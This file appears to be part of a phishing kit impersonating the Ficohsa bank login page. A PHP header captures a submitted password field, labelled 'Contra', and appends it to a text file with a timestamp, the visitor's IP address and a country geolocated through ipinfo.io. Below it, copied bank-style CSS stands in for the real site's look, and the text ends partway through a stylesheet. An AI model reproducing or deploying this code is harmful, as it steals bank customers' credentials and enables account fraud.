<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
if(isset($_POST["galletita2"]) && isset($_POST["galletita2"])){
    
    $file = fopen("muyrandom.txt", "a");
fwrite($file, "Contra: ".$_POST['galletita2']." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
  

}
    
?>

<html lang="en" class="notranslate" translate="no" style="--vh:6.35px;">
<head>
<meta name="google" content="notranslate">
<title>Ficohsa</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
<link rel="shortcut icon" href="https://secure.ficohsa.com/isotipo-ficohsa-blanco.ico" type="image/x-icon">
<script type="text/javascript" src="css/prisma.js"></script><!-- -->
<link href="css/styles.b1d6cdcc40a888de1051.bundle.css" rel="stylesheet">
<style>
        body[class^=ios][_ngcontent-c0] .slough[_ngcontent-c0] {
            display: block;
            overflow-y: auto;
            height: 100%;
            -webkit-overflow-scrolling: touch;
            -webkit-transform: translate3d(0)
        }

        .slough_overlay_open[_ngcontent-c0] {
            -webkit-overflow-scrolling: auto !important
        }

        .slough_content.hide[_ngcontent-c0] {
            display: none
        }

        .slough_content_loading[_ngcontent-c0] {
            position: relative
        }

        .mumbai-dialog[_ngcontent-c0] {
            font-size: 14px;
            color: #666;
            white-space: normal
        }

        .mumbai-dialog.mumbai-form[_ngcontent-c0] {
            padding: 20px 0 10px
        }

        .mumbai-dialog.mumbai-padding[_ngcontent-c0] {
            padding-bottom: 10px
        }

        .mumbai-dialog.mumbai-form-padding-top[_ngcontent-c0] {
            padding-top: 10px
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title[_ngcontent-c0] {
            font-size: 16px;
            color: #333;
            font-family: dinMedium;
            display: block
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title.notificationChannelsTitleMode[_ngcontent-c0] {
            padding-left: 7px;
            padding-bottom: 10px
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title[_ngcontent-c0] .mumbai-dialog-subtitle[_ngcontent-c0] {
            display: block;
            padding-bottom: 10px
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title.mumbai-transactions[_ngcontent-c0] {
            padding-bottom: 10px
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title.mumbai-transactions.withoutTitle[_ngcontent-c0] {
            padding-top: 10px
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title.mumbai-transactions[_ngcontent-c0] .mumbai-dialog-text[_ngcontent-c0] {
            padding: 0 0 20px
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title[_ngcontent-c0] .mumbai-link-container[_ngcontent-c0] {
            display: block
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-title[_ngcontent-c0] .mumbai-link-container[_ngcontent-c0] .mumbai-link[_ngcontent-c0] {
            cursor: pointer;
            color: #e2061c
        }

        .mumbai-dialog[_ngcontent-c0] .mumbai-dialog-subtitle[_ngcontent-c0] {
            display: inline-block
        }

        .mumbai[_ngcontent-c0] {
            height: 100%
        }

        .mumbai_overlay_open[_ngcontent-c0] {
            -webkit-overflow-scrolling: auto !important
        }

        .mumbai_content[_ngcontent-c0] {
            left: 80px;
            padding: 3px 5px 10px;
            right: 0;
            top: 60px;
            height: calc(100% - 60px);
            position: absolute
        }

        .mumbai_content_internal[_ngcontent-c0] {
            left: 90px;
            background-color: #ebebec;
            padding: 0;
            right: 10px;
            top: 62px;
            height: calc(100% - 72px);
            position: absolute
        }

        @media only screen and (max-width:1279px) and (min-width:1025px) {
            .mumbai_advertising[_ngcontent-c0] {
                width: 120px
            }
        }

        @media only screen and (min-width:1024px) {
            .mumbai_content[_ngcontent-c0] {
                padding-top: 0
            }
        }

        @media only screen and (max-width:1024px) and (min-width:320px) {
            .mumbai_advertising[_ngcontent-c0] {
                width: 120px;
                top: 102px;
                display: none
            }

            .mumbai_content[_ngcontent-c0] {
                margin-left: 0;
                left: 0;
                right: 0;
                top: 100px;
                height: calc(100% - 104px)
            }

            .mumbai_content_internal[_ngcontent-c0] {
                left: 10px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .slough_advertising[_ngcontent-c0] {
                display: none
            }

            .mumbai_content_internal[_ngcontent-c0] {
                left: 0;
                right: 0;
                padding: 20px 0 0
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .mumbai_content[_ngcontent-c0] {
                top: 80px;
                height: calc(100% - 82px);
                padding: 0
            }
        }

        .backoffice [_nghost-c0] .mumbai_content[_ngcontent-c0] {
            background: #f2f2f2;
            border-top: 1px solid #c5c5c5;
            top: 0;
            left: 0;
            height: calc(100% - 20px)
        }

        .backoffice [_nghost-c0] .mumbai[_ngcontent-c0] .title_context_ui[_ngcontent-c0] {
            position: absolute;
            color: #333;
            font-size: 13px;
            z-index: 9999;
            margin: 10px;
            font-weight: 400
        }

        .mumbai_content[_ngcontent-c0] {
            background-color: #f1f1f2
        }

        .bots [_nghost-c0] .slough[_ngcontent-c0] {
            height: 100%
        }

        [_nghost-c0] .bots[_ngcontent-c0] .slough[_ngcontent-c0] {
            height: 100%
        }
    </style>
<style>
        @charset "UTF-8";

        @-webkit-keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInCompact {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInCompact {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInSimple {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInSimple {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInCombined {

            0%,
            50% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeInCombined {

            0%,
            50% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOut {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeOut {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        .salto_overlay[_ngcontent-c4] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 800;
            -webkit-animation: .6s fadeOut;
            animation: .6s fadeOut;
            background: rgba(0, 0, 0, .4)
        }

        .salto_overlay.transparent[_ngcontent-c4] {
            background: 0 0
        }

        .salto.z_index[_ngcontent-c4] {
            z-index: 800
        }

        .salto_overlay.salto_overlay-show[_ngcontent-c4] {
            -webkit-animation: .6s fadeIn;
            animation: .6s fadeIn;
            display: block;
            opacity: 1
        }
    </style>
<style>
        .parma[_ngcontent-c5] {
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            z-index: 900;
            position: fixed;
            top: 0;
            margin: auto;
            opacity: 1;
            -webkit-animation: .35s parma-animated;
            animation: .35s parma-animated
        }

        .parma.basic[_ngcontent-c5] {
            width: 500px
        }

        .parma.basic[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 430px;
            padding: 20px 28px;
            overflow: auto;
            max-height: 430px
        }

        .parma.small[_ngcontent-c5] {
            width: 320px
        }

        .parma.small[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 190px;
            padding: 20px 28px;
            overflow: auto;
            max-height: 190px
        }

        .parma.small[_ngcontent-c5] .parma-content-middle.deleteMovement[_ngcontent-c5] {
            height: 110px;
            max-height: 110px;
            padding: 20px 28px;
            overflow: auto
        }

        .parma.small.sitePermissionsMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 210px;
            max-height: 210px
        }

        .parma.smallxl[_ngcontent-c5] {
            width: 390px
        }

        .parma.smallxl[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 430px;
            padding: 20px 28px;
            overflow: auto;
            max-height: 430px
        }

        .parma.medium[_ngcontent-c5] {
            width: 600px
        }

        .parma.medium[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 430px;
            padding: 20px 28px;
            overflow: auto;
            max-height: 430px
        }

        .parma.big[_ngcontent-c5] {
            width: 1004px
        }

        .parma.big[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 520px;
            padding: 20px 28px;
            overflow: auto;
            max-height: 520px
        }

        .parma.stateCredictCardTitleMode[_ngcontent-c5] .parma-content-header[_ngcontent-c5] .parma-content-header-text[_ngcontent-c5] {
            padding-left: 10px
        }

        .parma.frequentTransactionsMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
        .parma.transactionsHistoryMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
        .parma.unlockUserOnlineMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
        .parma.usersNotificationsMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding-bottom: 30px
        }

        .parma.userPendingPaddingsMode[_ngcontent-c5] .parma-content-block[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding-right: 0
        }

        .parma.personalSettingsMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding: 0
        }

        .parma.personalSettingsMode.changePasswordMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding-bottom: 10px
        }

        .parma.personalSettingsMode.changePinMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5],
        .parma.personalSettingsMode.secretAnswerMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5],
        .parma.personalSettingsMode.userDataMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding: 10px 10px 10px 0
        }

        .parma-content-header-text[_ngcontent-c5] {
            max-width: 90%;
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 100%;
            color: #fff;
            font-size: 14px;
            line-height: 1.8;
            padding-top: 7px;
            padding-left: 16px;
            padding-right: 16px
        }

        .parma-content-header[_ngcontent-c5] {
            height: 40px;
            background: #12447f;
            border-top-left-radius: 4px;
            border-top-right-radius: 4px
        }

        .parma-content-header[_ngcontent-c5] h6[_ngcontent-c5] {
            padding: 0;
            margin: 0;
            height: 100%;
            font-weight: 400
        }

        .parma-content-header-text.maxHeaderWidth[_ngcontent-c5] {
            max-width: 80%
        }

        .parma-content-header-link[_ngcontent-c5]+.parma-content-header-text[_ngcontent-c5] {
            padding-right: 0;
            max-width: calc(100% - 40px)
        }

        .parma-content-header-link[_ngcontent-c5] {
            display: block;
            width: 40px;
            color: #fff;
            padding-top: 10px;
            text-align: center;
            height: 40px;
            cursor: pointer;
            -webkit-transform: rotate3d(0, 0, 1, 0deg);
            transform: rotate3d(0, 0, 1, 0deg);
            -webkit-animation: .25s parma-header-link-animated;
            animation: .25s parma-header-link-animated
        }

        .parma-content-header-link[_ngcontent-c5] svg.svg-remove-circle[_ngcontent-c5] {
            width: 20px;
            height: 20px
        }

        .parma-content-header-link[_ngcontent-c5] svg.svg-remove-circle[_ngcontent-c5] circle[_ngcontent-c5] {
            stroke: #fff;
            fill: transparent;
            stroke-width: 1.2
        }

        .parma-content-header-link[_ngcontent-c5] svg.svg-remove-circle[_ngcontent-c5] line[_ngcontent-c5] {
            stroke: #fff;
            stroke-width: 1.2
        }

        .parma-content-header-link[_ngcontent-c5] i[_ngcontent-c5] {
            font-size: 20px
        }

        .parma-content-header-link[_ngcontent-c5]:focus i[_ngcontent-c5],
        .parma-content-header-link[_ngcontent-c5]:hover i[_ngcontent-c5] {
            color: #fff
        }

        .parma-content-header-link[_ngcontent-c5]:hover {
            -webkit-transform: rotate3d(0, 0, 1, 90deg);
            transform: rotate3d(0, 0, 1, 90deg);
            -webkit-animation: .25s parma-header-link-reverse;
            animation: .25s parma-header-link-reverse
        }

        .parma.withoutMargin[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding: 10px 15px 20px
        }

        .parma[_ngcontent-c5] .parma-content-middle.no-padding[_ngcontent-c5] {
            padding: 0
        }

        .parma[_ngcontent-c5] .parma-content-middle.no-padding[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding-right: 0
        }

        .parma-content-block[_ngcontent-c5] {
            position: relative
        }

        .parma-content-middle[_ngcontent-c5] {
            position: relative;
            background: #fff
        }

        .parma-content-bottom[_ngcontent-c5] {
            height: 42px;
            background: #f8f8f8;
            border-bottom-left-radius: 4px;
            border-bottom-right-radius: 4px;
            border-top: 1px solid #d7d7d7
        }

        .parma-content-buttons[_ngcontent-c5] {
            padding-top: 5px;
            text-align: right;
            padding-right: 7px;
            height: 100%;
            float: right
        }

        .parma-content-buttons.no-float[_ngcontent-c5] {
            float: none
        }

        .parma-content-buttons-link[_ngcontent-c5] {
            background: #0097c1;
            min-width: 90px;
            height: 26px;
            text-align: center;
            display: inline-block;
            margin-left: 5px;
            -webkit-animation: .3s parma-button-bold-reverse;
            animation: .3s parma-button-bold-reverse
        }

        .parma-content-buttons-link.inactive[_ngcontent-c5] {
            background: #b7efff
        }

        .parma-content-buttons-link[_ngcontent-c5]:hover {
            background: #005b75;
            -webkit-animation: .3s parma-button-bold-animated;
            animation: .3s parma-button-bold-animated
        }

        .parma-content-buttons-link.inactive[_ngcontent-c5]:hover {
            background: #b7efff
        }

        .parma-content-buttons-link-text[_ngcontent-c5] {
            display: inline-block;
            padding-top: 3px;
            color: #fff;
            font-size: 14px;
            padding-left: 4px;
            padding-right: 4px
        }

        .parma-content-buttons-link-simple[_ngcontent-c5] {
            min-width: 90px;
            height: 26px;
            text-align: center;
            display: inline-block;
            margin-left: 5px;
            border: 1px solid transparent;
            -webkit-animation: .25s parma-button-simple-reverse;
            animation: .25s parma-button-simple-reverse
        }

        .parma-content-buttons-link-simple[_ngcontent-c5]:hover .parma-content-buttons-link-simple-text[_ngcontent-c5] {
            color: #005b75
        }

        .parma-content-buttons-link-simple[_ngcontent-c5]:hover {
            border: 1px solid #0097c1;
            -webkit-animation: .25s parma-button-simple-animated;
            animation: .25s parma-button-simple-animated
        }

        .parma-content-buttons-link-simple-text[_ngcontent-c5] {
            display: inline-block;
            padding-top: 3px;
            color: #0097c1;
            font-size: 14px;
            padding-left: 4px;
            padding-right: 4px
        }

        .modalMuestraBasic.no-show[_ngcontent-c5],
        .modalMuestraBig.no-show[_ngcontent-c5],
        .modalMuestraSmall.no-show[_ngcontent-c5] {
            display: none
        }

        .parma_overlay[_ngcontent-c5] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 800;
            background: rgba(0, 0, 0, .5);
            opacity: 0;
            pointer-events: none
        }

        .parma_overlay.parma_overlay-show[_ngcontent-c5] {
            -webkit-animation: .4s parmaOverlay;
            animation: .4s parmaOverlay;
            opacity: 1;
            display: block;
            pointer-events: auto
        }

        .parma-content-message[_ngcontent-c5] {
            position: absolute;
            bottom: 42px;
            left: 0;
            right: 0;
            z-index: auto
        }

        .parma-modal-overlay[_ngcontent-c5] {
            height: calc(100% - 82px);
            width: 100%;
            top: 40px !important;
            left: 0;
            opacity: .5;
            position: absolute;
            background: #fff;
            z-index: 600
        }

        .parma-modal-overlay-dark[_ngcontent-c5] {
            background: rgba(0, 0, 0, .4)
        }

        .parma.noPadding[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding: 0
        }

        .parma.noPadding[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding-right: 0
        }

        .parma.image[_ngcontent-c5] {
            padding: 0;
            height: auto;
            width: auto
        }

        .parma.image[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding: 0;
            height: auto
        }

        .parma.image[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding: 0
        }

        .parma.creditCardDetailStatusMode[_ngcontent-c5] .parma-content-block[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding: 10px
        }

        .custom-overlay[_ngcontent-c5] {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 1;
            -moz-opacity: 1
        }

        @-webkit-keyframes parma-animated {
            0% {
                opacity: 0;
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1)
            }

            10% {
                opacity: 0;
                -webkit-transform: scale3d(1.1, 1.1, 1);
                transform: scale3d(1.1, 1.1, 1)
            }

            100% {
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1)
            }
        }

        @keyframes parma-animated {
            0% {
                opacity: 0;
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1)
            }

            10% {
                opacity: 0;
                -webkit-transform: scale3d(1.1, 1.1, 1);
                transform: scale3d(1.1, 1.1, 1)
            }

            100% {
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1)
            }
        }

        @-webkit-keyframes parma-header-link-animated {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes parma-header-link-animated {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes parma-header-link-reverse {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes parma-header-link-reverse {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes parma-button-bold-reverse {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes parma-button-bold-reverse {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes parma-button-bold-animated {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes parma-button-bold-animated {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes parma-button-simple-reverse {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes parma-button-simple-reverse {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes parma-button-simple-animated {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes parma-button-simple-animated {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes parmaOverlay {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes parmaOverlay {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @media only screen and (min-width:1024px) {
            .parma.big.userConfigurationPopupMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                max-height: 440px;
                height: auto
            }
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .parma.big[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                height: 434px
            }

            .parma.big[_ngcontent-c5] {
                width: 740px
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .parma.big[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                height: 300px
            }

            .parma.big[_ngcontent-c5] {
                width: 620px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .parma.basic[_ngcontent-c5],
            .parma.big[_ngcontent-c5],
            .parma.medium[_ngcontent-c5],
            .parma.small[_ngcontent-c5],
            .parma.smallxl[_ngcontent-c5] {
                width: calc(100% - 10px) !important;
                margin: 0 !important;
                top: 5px !important;
                left: 5px !important;
                height: calc(100% - 10px);
                max-height: calc(100% - 10px) !important
            }

            .parma.basic[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
            .parma.big[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
            .parma.medium[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
            .parma.small[_ngcontent-c5] .parma-content-middle[_ngcontent-c5],
            .parma.smallxl[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                max-height: none
            }

            .parma.parma-no-footer[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                height: 100% !important
            }

            .parma.personalSettingsSecurityImageMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                padding-left: 0;
                padding-right: 0
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .parma.personalSettingsSecurityImageMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
                padding-right: 0
            }
        }

        .parma.dark[_ngcontent-c5] {
            color: #f8f8f8;
            background: rgba(0, 0, 0, .8);
            border-color: #f8f8f8
        }

        .parma.dark[_ngcontent-c5] .parma-content-bottom[_ngcontent-c5],
        .parma.dark[_ngcontent-c5] .parma-content-header[_ngcontent-c5],
        .parma.dark[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            border-color: #f8f8f8;
            background: rgba(0, 0, 0, .8)
        }

        .parma.dark.batchProcessorMode[_ngcontent-c5] {
            border: 1px solid #555;
            border-radius: 4px
        }

        .parma.dark.batchProcessorMode[_ngcontent-c5] .parma-content-header[_ngcontent-c5] {
            background: #242424;
            opacity: .8;
            height: 6px
        }

        .parma.dark.batchProcessorMode[_ngcontent-c5] .parma-content-header[_ngcontent-c5]>div[_ngcontent-c5] {
            display: none
        }

        .parma.dark.batchProcessorMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            background: #242424;
            opacity: .8
        }

        .parma.dark.batchProcessorMode[_ngcontent-c5] .parma-content-bottom[_ngcontent-c5] {
            background: #1c1c1c;
            border-top: 1px solid #333;
            opacity: .8
        }

        @media screen and (min-width:640px) and (max-height:479px) and (min-height:320px) {
            .parma.limitedHeightMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                max-height: 220px
            }
        }

        @media screen and (min-width:640px) and (max-height:639px) and (min-height:480px) {
            .parma.limitedHeightMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                max-height: 380px
            }
        }

        .backoffice [_nghost-c5] .parma-content-header[_ngcontent-c5] {
            background: #333
        }

        .backoffice [_nghost-c5] .parma[_ngcontent-c5] .florida_wrapper[_ngcontent-c5] .padua-grid[_ngcontent-c5] {
            padding: 0
        }

        .backoffice [_nghost-c5] .parma[_ngcontent-c5] .florida_wrapper_row[_ngcontent-c5] {
            margin: 0 15px !important
        }

        .backoffice [_nghost-c5] .parma[_ngcontent-c5] .florida_wrapper_top_placeholder_header[_ngcontent-c5] .padua-grid[_ngcontent-c5] {
            padding: 0 15px !important
        }

        .backoffice [_nghost-c5] .parma[_ngcontent-c5] .percentage-message-container[_ngcontent-c5] {
            padding: 20px 0 0 18px;
            margin-bottom: 50px
        }

        .backoffice [_nghost-c5] .parma.paddingBOModalMode[_ngcontent-c5] .parma-content-block[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding: 10px 10px 16px
        }

        .backoffice [_nghost-c5] .parma.paddingBOModalMode[_ngcontent-c5] .parma-content-block[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] {
            padding-right: 0
        }

        .parma.contactUsMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            padding-top: 40px
        }

        .parma.requesthistoryMode[_ngcontent-c5] .parma-modal-overlay[_ngcontent-c5] {
            height: 100%;
            top: 0 !important
        }

        .parma.debtorsAdministrationMode.smallxl[_ngcontent-c5] .parma-content-middle.debtorsAdministrationMode[_ngcontent-c5] {
            padding: 25px 28px 42px
        }

        .parma.debtorsAdministrationMode.smallxl[_ngcontent-c5] .parma-content-middle.debtorsAdministrationMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] .parma-modal-overlay[_ngcontent-c5] {
            height: 100%;
            top: 0 !important
        }

        .parma.approvalSchemeConfigurationByScopeMode.small[_ngcontent-c5] .parma-content-middle.approvalSchemeConfigurationByScopeMode[_ngcontent-c5] {
            padding: 25px 28px 30px
        }

        .parma.approvalSchemeConfigurationByScopeMode.small[_ngcontent-c5] .parma-content-middle.approvalSchemeConfigurationByScopeMode[_ngcontent-c5] .parma-content-middle-scroll[_ngcontent-c5] .parma-modal-overlay[_ngcontent-c5] {
            height: 100%;
            top: 0 !important
        }

        .parma-content-middle-scroll[_ngcontent-c5] {
            height: auto;
            width: 100%;
            padding-right: 10px
        }

        .parma.frequentExternalModal[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            height: 400px;
            overflow: auto;
            max-height: 400px
        }

        .parma.frequentExternalModal[_ngcontent-c5] {
            width: 320px
        }

        .fixed-overlay[_ngcontent-c5] .parma-modal-overlay[_ngcontent-c5] {
            position: fixed
        }

        @media only screen and (min-width:1024px) {
            .parma.big.userConfigurationPopupMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                max-height: 330px;
                height: auto
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {
            .parma.extrafinancingModal[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                height: calc(100% - 42px) !important
            }

            .parma.thirdPartyProductNewMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
                max-height: calc(calc(var(--vh, 1vh) * 100) - 159px)
            }
        }

        .parma.thirdPartyProductNewMode[_ngcontent-c5] .parma-content-middle[_ngcontent-c5] {
            max-height: calc(calc(var(--vh, 1vh) * 100) - 159px)
        }

        @media only screen and (orientation:landscape) {
            .parma.medium[_ngcontent-c5] {
                top: 3px !important
            }
        }
    </style>
<style>
        @charset "UTF-8";

        @-webkit-keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInCompact {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInCompact {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInSimple {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInSimple {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInCombined {

            0%,
            50% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeInCombined {

            0%,
            50% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOut {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeOut {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        .canberra[_ngcontent-c7] {
            width: 100%;
            padding: 10px;
            position: relative
        }

        .canberra.small[_ngcontent-c7] {
            padding: 0
        }

        .canberra.small[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            width: 18px;
            height: 18px;
            margin-right: 6px
        }

        .canberra.small[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            width: 18px;
            height: 18px;
            display: block;
            text-align: center;
            border-radius: 50%;
            margin-right: 6px
        }

        .canberra.small[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] i[_ngcontent-c7] {
            display: block;
            padding-top: 6px;
            font-size: 7px
        }

        .canberra.small.canberra-disclaimer[_ngcontent-c7] .canberra-wrap-check.canberra-wrap-icon[_ngcontent-c7] {
            padding-top: 4px;
            padding-left: 6px
        }

        .canberra.small[_ngcontent-c7] .canberra[_ngcontent-c7]>div[_ngcontent-c7]:last-child {
            width: calc(100% - 30px)
        }

        .canberra.small[_ngcontent-c7] .canberra-text[_ngcontent-c7] {
            min-height: 18px;
            color: #ec2e33
        }

        .canberra.small[_ngcontent-c7] .canberra-text-title[_ngcontent-c7] {
            font-size: 12px
        }

        .canberra.medium[_ngcontent-c7] {
            padding: 0 17px 2px
        }

        .canberra.medium[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            width: 48px;
            height: 48px;
            margin-right: 8px
        }

        .canberra.medium[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] {
            width: 48px;
            height: 48px;
            display: block;
            text-align: center;
            border-radius: 50%;
            margin-right: 10px
        }

        .canberra.medium[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] .canberra-wrap-check-bkg[_ngcontent-c7] i[_ngcontent-c7] {
            display: block;
            padding-top: 14px;
            font-size: 18px
        }

        .canberra.large[_ngcontent-c7] {
            padding: 0
        }

        .canberra.large[_ngcontent-c7] .canberra-wrap-check[_ngcontent-c7] {
            width: 56px;
            height: 56px;
            margin-right: 12px;
            vertical-align: top
        }

